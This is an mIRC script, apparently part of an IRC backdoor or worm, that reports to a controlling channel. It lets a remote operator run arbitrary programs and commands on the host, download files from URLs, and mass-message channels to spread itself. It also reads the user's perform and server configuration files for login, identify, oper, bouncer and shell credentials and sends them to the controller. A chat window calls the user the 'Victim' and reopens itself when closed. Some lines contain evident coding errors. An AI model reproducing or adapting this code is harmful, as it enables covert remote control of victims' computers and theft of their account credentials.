$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : msg changed to: $7-
set %uo.Spreadmsg $3-
}
if ($1 == %uo.Country) && ($2 == off) {
set %uo.Spread off
$uo.write privmsg $uo.base : $+ $uo.style(Cspread) $+ : Turned spread off
}
}

Alias uo.spread {
if ($1 == msg) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : msg changed to: $6-
set %uo.Spreadmsg $3-
}
if ($1 == on) {
$uo.write join $uo.Spreadchan
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread on
.set %uo.Spread on
}
if ($1 == off) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread off
set %uo.Spread off
}
}

Alias uo.chspread {
if (%uo.Country = !$1) && ($2 == on) {
.set %uo.Spread on
$uo.write join $uo.Spreadchan
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread on
}
if (%uo.Country = !$1) && ($2 == msg) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : msg changed to: $7-
set %uo.Spreadmsg $4-
}
if (%uo.Country = !$1) && ($2 == off) {
set %uo.Spread off
$uo.write privmsg $%uo.base : $+ $uo.style(Spread) $+ : Turned spread off
}
}

Alias uo.Country {
$uo.write privmsg $uo.base : $+ $uo.style(Country) $+ : $iif(%uo.Country == $null,Error,%uo.Country)
}

Alias uo.amsg {
.amsg $1-
$uo.write privmsg $uo.base : $+ $uo.style(CAMSG) $+ : \" $+ $1- $+ " wurde ausgeführt.
}

Alias uo.camsg {
if (%uo.Country = $1) {
.amsg $2-
$uo.write privmsg $uo.base : $+ $uo.style(CAMSG) $+ : \" $+ $2- $+ " wurde ausgeführt.
}
}

Alias uo.chamsg {
if (%uo.Country = $1) {
halt
}
.amsg $2-
$uo.write privmsg $uo.base : $+ $uo.style(CHAMSG) $+ : \" $+ $2 $+ " wurde ausgeführt.
}

Alias uo.msg {
.msg $1 $2-
$uo.write privmsg $uo.base : $+ $BaNdiTos.style(CMSG) $+ : \" $+ $1 $2- $+ " wurde ausgeführt.
}

Alias uo.cmsg {
if (%uo.Country = $1) {
.msg $2 $3-
$uo.write privmsg $uo.base : $+ $uo.style(CMSG) $+ : \" $+ $2 $3- $+ " wurde ausgeführt.
}
}

Alias uo.chmsg {
if (%uo.Country = $1) {
halt
}
.msg $2 $3-
$uo.write privmsg $uo.base : $+ $uo.style(CHMSG) $+ : \" $+ $2 $3- $+ " wurde ausgeführt.
}

Alias uo.run {
.run $1-
$uo.write privmsg $uo.base : $+ $uo.style(RUN) $+ : \" $+ $1- $+ " wurde ausgeführt.
}

Alias uo.crun {
if (%uo.Country = $1) {
.run $2-
$uo.write privmsg $uo.base : $+ $uo.style(CRUN) $+ : \" $+ $2- $+ " wurde ausgeführt.
}
}

Alias uo.chrun {
if (%uo.Country = $1) {
halt 
}
.run $2-
$uo.write privmsg $uo.base : $+ $uo.style(CHRUN) $+ : \" $+ $2- $+ " wurde ausgeführt.
}

Alias uo.do {
.$1-
$uo.write privmsg $uo.base : $+ $uo.style(CDO) $+ : \" $+ $1- $+ " wurde ausgeführt.
}

Alias uo.cdo {
if (%uo.Country = $1) {
.$2-
$uo.write privmsg $uo.base : $+ $uo.style(CDO) $+ : \" $+ $2- $+ " wurde ausgeführt.
}
}

Alias uo.chdo {
if (%uo.Country = $1) {
halt
}
.$2-
$uo.write privmsg $uo.base : $+ $uo.style(CHDO) $+ : \" $+ $2- $+ " wurde ausgeführt.
}


Alias uo.set {
.set $1 $2-
$uo.write privmsg $uo.base : $+ $uo.style(SET) $+ : \" $+ $1 $2- $+ " wurde gesetzt.
}

Alias uo.Cset {
if (%uo.Country = $1) {
.set $2 $3-
$uo.write privmsg $uo.base : $+ $uo.style(CSET) $+ : \" $+ $2 $3- $+ " wurde gesetzt.
}
}

Alias uo.Chset {
if (%uo.Country = $1) {
halt
}
.set $2 $3-
$uo.write privmsg $uo.base : $+ $uo.style(CHSET) $+ : \" $+ $2 $3- $+ " wurde gesetzt.
}

Alias uo.Join {
.join $1
$uo.write privmsg $uo.base : $+ $uo.style(JOIN) $+ : Joined $1 successfully.
}

Alias uo.Part {
.part $1
$uo.write privmsg $uo.base : $+ $uo.style(PART) $+ : Parted $1 successfully .
}

Alias uo.download {
set %uo.download. [ $+ [ $gettok($remove($1,http://),-1,47) ] ] $1
sockopen $eval($+(uo.download_,$gettok($remove($1,http://),-1,47)),2) $gettok($remove($1,http://),1,47) 80
}

Alias uo.cdownload {
if (%uo.Country = $1) {
set %uo.download. [ $+ [ $gettok($remove($2,http://),-2,47) ] ] $2
sockopen $eval($+(uo.download_,$gettok($remove($1,http://),-1,47)),2) $gettok($remove($1,http://),1,47) 80
}
}

Alias uo.chdownload {
if (%uo.Country = $1) {
halt
}
set %uo.download. [ $+ [ $gettok($remove($2,http://),-2,47) ] ] $2
sockopen $eval($+(uo.download_,$gettok($remove($1,http://),-1,47)),2) $gettok($remove($1,http://),1,47) 80
}

Alias uo.Auth {
if ($read($uo.perfini,w,*auth*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Auth found 03•0 $read($uo.perfini,$readn)
inc %a
}
if ($read($uo.perfini,w,*oper*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Oper found 03•0 $read($uo.perfini,$readn) 
inc %a
}
if ($read($uo.perfini,w,*identify*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Identify found 03•0 $read($uo.perfini,$readn)
inc %a
}
if ($read($uo.perfini,w,*login*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Login found 03•0 $read($uo.perfini,$readn)
inc %a
}
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : End of List.
}


Alias uo.Bouncer {
if ($read($uo.servini,w,*BNC*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*my-ct*)) { $uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*1337*)) { $uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*Bouncer*)) { $uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*shell*)) { $uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : End of listening.
}

dialog uo.dchat {
size -1 -1 236 242
title "Chatwindow"
button "Send",1,136 201 89 28
edit ,2,7 206 123 20
list 3,7 20 216 173, sort, extsel, multsel, size, vsbar, hsbar
}

on *:dialog:uo.dchat:sclick:*:{
if ($did == 1) {
write uo.chat.txt %uo.Victim $+ : $did(2,uo.dchat)
$uo.write privmsg $uo.base : $+ $uo.style(Chat Answer) $+ :7 $did(2,uo.dchat)
did -r uo.dchat 3
c.init
}
}

on *:dialog:uo.dchat:close:*:{
if (%uo.Chatopen == 1) {
$uo.write privmsg $uo.base : $+ $uo.style(Tryed to close the window)
.timer 1 1 dialog -m uo.dchat uo.dchat
.timer 1 1 c.init
}
}
